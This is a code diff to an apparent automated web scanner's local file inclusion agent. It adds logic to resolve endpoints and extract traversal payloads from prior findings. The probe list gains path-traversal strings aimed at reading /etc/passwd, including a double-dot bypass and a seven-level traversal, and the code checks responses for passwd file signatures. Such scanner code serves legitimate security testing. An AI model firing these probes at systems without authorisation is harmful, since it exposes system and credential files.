@@ -283,6 +283,64 @@ class LFIAgent(BaseAgent, TechContextMixin):
 
         return False
 
+    def _resolve_endpoint_url(self, url: str, param: str, finding: dict) -> str:
+        """Extract actual endpoint URL from finding data when base URL is generic.
+
+        DASTySAST sometimes reports a documentation/debug URL but includes the
+        real API endpoint in the payload or exploitation_strategy fields.
+        Resolves when the param isn't present in the URL's query string.
+        """
+        parsed = urlparse(url)
+        existing_params = parse_qs(parsed.query)
+
+        # If the URL already has this param in query, it's likely the right endpoint
+        if param in existing_params:
+            return url
+
+        # Check finding fields for a more specific URL/path
+        for field in ("exploitation_strategy", "payload"):
+            hint = finding.get(field, "")
+            if not hint or not isinstance(hint, str):
+                continue
+            # Extract path that contains the parameter name
+            if f"{param}=" in hint or f"?{param}" in hint:
+                # Hint is a relative path like "/api/products/1/image?file=..."
+                # or absolute URL — extract the path portion before the param
+                hint_parsed = urlparse(hint) if "://" in hint else urlparse(f"https://placeholder{hint}")
+                if hint_parsed.path and hint_parsed.path != "/":
+                    resolved = f"{parsed.scheme}://{parsed.netloc}{hint_parsed.path}"
+                    logger.info(f"[{self.name}] Resolved endpoint: {url} → {resolved} (from {field})")
+                    return resolved
+
+        return url
+
+    @staticmethod
+    def _extract_traversal_payload(finding: dict) -> Optional[str]:
+        """Extract a clean LFI traversal payload from DASTySAST finding data.
+
+        DASTySAST sometimes embeds traversal payloads inside full URL paths like:
+          /api/products/1/image?file=../../../../etc/passwd
+        This extracts just the traversal portion: ../../../../etc/passwd
+        """
+        for field in ("payload", "exploitation_strategy"):
+            raw = finding.get(field, "")
+            if not raw or not isinstance(raw, str):
+                continue
+            # If the payload contains a query string, extract the parameter value
+            if "?" in raw and "=" in raw:
+                from urllib.parse import urlparse as _urlparse, parse_qs as _parse_qs
+                parsed = _urlparse(raw) if "://" in raw else _urlparse(f"https://x{raw}")
+                for _k, vals in _parse_qs(parsed.query).items():
+                    for v in vals:
+                        if ".." in v or v.startswith("/etc/") or v.startswith("/proc/"):
+                            return v
+            # If it's a plain traversal string, use it directly
+            if ".." in raw and "/" in raw and "?" not in raw and " " not in raw:
+                return raw
+            if raw.startswith("/etc/") or raw.startswith("/proc/"):
+                return raw
+        return None
+
     def _inject_payload(self, url, param, payload):
         parsed = urlparse(url)
         q = parse_qs(parsed.query)
@@ -515,6 +573,16 @@ Focus on parameter+file deduplication. Same file via different traversal depths 
             parameter = finding_data.get("parameter", "")
             finding = finding_data.get("finding", {})
 
+            # Skip malformed parameter names (e.g. "template_url / path (Inferred...)")
+            import re
+            if not re.match(r'^[\w\-\.]+$', parameter):
+                logger.info(f"[{self.name}] Phase B [{idx}/{len(self._dry_findings)}]: Skipping invalid param name: {parameter!r}")
+                continue
+
+            # Resolve actual endpoint from finding data when URL is too generic
+            # DASTySAST may report root URL but include the real endpoint in payload/strategy
+            url = self._resolve_endpoint_url(url, parameter, finding)
+
             logger.info(f"[{self.name}] Phase B [{idx}/{len(self._dry_findings)}]: Testing {url}?{parameter}")
 
             if hasattr(self, '_v'):
@@ -717,7 +785,7 @@ Focus on parameter+file deduplication. Same file via different traversal depths 
         # Run validation using existing LFI testing logic
         return await self._test_single_param_from_queue(url, param, finding)
 
-    async def _smart_probe_lfi(self, url: str, param: str) -> Tuple[bool, Optional[Dict]]:
+    async def _smart_probe_lfi(self, url: str, param: str, *, hint_payload: Optional[str] = None) -> Tuple[bool, Optional[Dict]]:
         """
         Smart probe: 1-2 requests to test if path traversal causes any behavioral change.
 
@@ -725,6 +793,9 @@ Focus on parameter+file deduplication. Same file via different traversal depths 
         - If file content signature found → direct confirmation (return finding)
         - If behavioral change (status/length) → worth investigating (continue)
         - If identical to baseline → skip all heavy testing
+
+        Args:
+            hint_payload: Optional traversal payload extracted from DASTySAST finding.
 
         Returns:
             (should_continue, finding_or_none)
@@ -746,7 +817,15 @@ Focus on parameter+file deduplication. Same file via different traversal depths 
                 # Step 2: Send traversal probes
                 lfi_signatures = ["root:x:0:0", "root:*:0:0", "[extensions]", "[fonts]",
                                   "127.0.0.1 localhost", "PD9waH"]
-                probes = ["../../etc/passwd", "....//....//etc/passwd"]
+                probes = [
+                    "/etc/passwd",                    # Absolute path (no join or direct read)
+                    "../../etc/passwd",               # Relative traversal (2 levels)
+                    "....//....//etc/passwd",          # Double-dot bypass
+                    "../../../../../../../etc/passwd", # Deep traversal (7 levels)
+                ]
+                # Add DASTySAST hint payload if available and not already in probes
+                if hint_payload and hint_payload not in probes:
+                    probes.insert(0, hint_payload)
 
                 for probe in probes:
                     if hasattr(self, '_v'):
@@ -806,8 +885,11 @@ Focus on parameter+file deduplication. Same file via different traversal depths 
         Uses existing validation pipeline optimized for queue processing.
         """
         try:
+            # Extract hint payload from DASTySAST finding for additional probe coverage
+            hint_payload = self._extract_traversal_payload(finding)
+
             # Smart probe: skip if no traversal behavior detected
-            should_continue, direct_finding = await self._smart_probe_lfi(url, param)
+            should_continue, direct_finding = await self._smart_probe_lfi(url, param, hint_payload=hint_payload)
             if direct_finding:
                 return direct_finding
             if not should_continue:
